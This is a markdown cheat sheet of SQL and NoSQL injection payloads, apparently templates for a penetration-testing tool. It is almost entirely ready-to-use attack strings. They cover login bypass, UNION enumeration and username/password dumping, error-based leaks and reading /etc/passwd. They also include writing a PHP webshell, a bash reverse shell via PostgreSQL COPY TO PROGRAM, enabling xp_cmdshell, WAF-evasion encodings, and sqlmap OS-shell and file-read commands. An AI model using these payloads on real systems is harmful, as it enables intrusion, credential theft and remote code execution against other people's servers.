# SQLi Payloads

> SQL Injection payloads — auth bypass, UNION, error-based, blind/boolean, time-based, WAF bypass

<!-- tags: sqli, sql, injection, web, payload, exploit -->

---

## SQLi - Auth Bypass Classic
Bypass login by always-true comment.

```bash
echo "admin' or 1=1-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass,login -->

---

## SQLi - Auth Bypass with Hash Stop
Closes hash style or terminates statement.

```bash
echo "admin' or 1=1#"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass -->

---

## SQLi - Auth Bypass No Username
Use null/empty user with always-true clause.

```bash
echo "' or 0=0 #"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,authbypass -->

---

## SQLi - Detect Injection Point
Single quote test to break syntax.

```bash
echo "{{PARAM:str:id}}=1'"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,detection -->

---

## SQLi - Boolean Test (true/false)
Compare responses for boolean blind detection.

```bash
echo "{{PARAM:str:id}}=1' AND 1=1-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,boolean -->

---

## SQLi - Time-Based Blind (MySQL)
Detect via SLEEP delay.

```bash
echo "{{PARAM:str:id}}=1' AND SLEEP(5)-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,mysql -->

---

## SQLi - Time-Based Blind (PostgreSQL)
Postgres time delay.

```bash
echo "{{PARAM:str:id}}=1'; SELECT pg_sleep(5)-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,postgres -->

---

## SQLi - Time-Based Blind (MSSQL)
WAITFOR DELAY for SQL Server.

```bash
echo "{{PARAM:str:id}}=1'; WAITFOR DELAY '0:0:5'-- -"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,mssql -->

---

## SQLi - Time-Based Blind (Oracle)
Oracle dbms_pipe time delay.

```bash
echo "{{PARAM:str:id}}=1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)='a"
```

<!-- meta: risk=safe | phase=vuln | tags=sqli,blind,time,oracle -->

---

## SQLi - UNION Find Column Count (ORDER BY)
Increment until error.

```bash
echo "{{PARAM:str:id}}=1' ORDER BY {{N:int:5}}-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,columns -->

---

## SQLi - UNION Find Column Count (NULL)
Increase NULL count to find column number.

```bash
echo "{{PARAM:str:id}}=1' UNION SELECT NULL,NULL,NULL-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,columns -->

---

## SQLi - UNION Banner (MySQL)
Get DB version via UNION.

```bash
echo "{{PARAM:str:id}}=1' UNION SELECT 1,version(),3-- -"
```

<!-- meta: risk=safe | phase=enum | tags=sqli,union,banner,mysql -->

---

## SQLi - UNION List Databases (MySQL)
Pull all schemas.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(schema_name),5,6,7 FROM information_schema.schemata-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## SQLi - UNION List Tables (MySQL)
List tables for specific DB.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(table_name),5,6,7 FROM information_schema.tables WHERE table_schema='{{DB:str:hotel}}'-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## SQLi - UNION List Columns (MySQL)
List columns of a target table.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(column_name),5,6,7 FROM information_schema.columns WHERE table_name='{{TABLE:str:user}}'-- -"
```

<!-- meta: risk=med | phase=enum | tags=sqli,union,enum,mysql -->

---

## SQLi - UNION Dump Data (MySQL)
Dump rows from chosen table.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(username,0x3a,password),5,6,7 FROM {{TABLE:str:users}}-- -"
```

<!-- meta: risk=high | phase=exploit | tags=sqli,union,dump,mysql -->

---

## SQLi - Error-Based ExtractValue (MySQL)
Trigger error to leak data.

```bash
echo "{{PARAM:str:id}}=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,error,mysql -->

---

## SQLi - Error-Based UpdateXML (MySQL)
Same idea via UPDATEXML.

```bash
echo "{{PARAM:str:id}}=1' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,error,mysql -->

---

## SQLi - Read File (MySQL LOAD_FILE)
Read server file via LOAD_FILE — needs FILE priv.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
```

<!-- meta: risk=high | phase=exploit | tags=sqli,fileread,mysql -->

---

## SQLi - Write Webshell (MySQL INTO OUTFILE)
Drop PHP shell to webroot.

```bash
echo "{{PARAM:str:id}}=1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,filewrite,mysql -->

---

## SQLi - PostgreSQL RCE (COPY PROGRAM)
Reverse shell via COPY TO PROGRAM.

```bash
echo "COPY (SELECT '') to PROGRAM 'bash -c \"bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}} 0>&1\"'"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,postgres -->

---

## SQLi - MSSQL xp_cmdshell
Enable + run OS command via xp_cmdshell.

```bash
echo "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '{{CMD:str:whoami}}'-- -"
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,rce,mssql -->

---

## SQLi - WAF Bypass: Inline Comments
Break keywords with /**/ comments.

```bash
echo "UN/**/ION SE/**/LECT 1,2,3-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,bypass -->

---

## SQLi - WAF Bypass: Mixed Case + URL Encode
Bypass naive filters.

```bash
echo "%55nIoN%20%53eLeCt%201,2,3--%20-"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,encoding -->

---

## SQLi - WAF Bypass: Char Encoding
Use CHAR()/CONCAT to avoid quoted strings.

```bash
echo "UNION SELECT CHAR(97,100,109,105,110)-- -"
```

<!-- meta: risk=med | phase=exploit | tags=sqli,waf,bypass -->

---

## SQLi - sqlmap from Burp Request
Run sqlmap against saved Burp request.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --level 5 --risk 3 --dbs
```

<!-- meta: risk=med | phase=exploit | tags=sqli,sqlmap,burp -->

---

## SQLi - sqlmap Read Local File
Read file via sqlmap.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --file-read=/etc/passwd
```

<!-- meta: risk=high | phase=exploit | tags=sqli,sqlmap,fileread -->

---

## SQLi - sqlmap OS Shell
Drop OS shell over the SQLi.

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --os-shell
```

<!-- meta: risk=critical | phase=exploit | tags=sqli,sqlmap,rce -->

---

## SQLi - sqlmap Specific Technique
Force only the listed techniques (B/E/U/S/T/Q).

```bash
sqlmap -r {{REQFILE:file:request.req}} --batch --technique=UE -D {{DB:str:hotel}} --dump-all --dbms=MySQL
```

<!-- meta: risk=med | phase=exploit | tags=sqli,sqlmap -->

---

## NoSQL - Login Bypass (MongoDB)
Use $ne to bypass login JSON.

```bash
echo '{"username":{"$ne":null},"password":{"$ne":null}}'
```

<!-- meta: risk=med | phase=exploit | tags=nosqli,mongodb,authbypass -->

---

## NoSQL - Regex Brute (MongoDB)
Iterate regex to extract password char by char.

```bash
echo '{"username":"admin","password":{"$regex":"^{{CHAR:str:a}}"}}'
```

<!-- meta: risk=med | phase=exploit | tags=nosqli,mongodb,blind -->
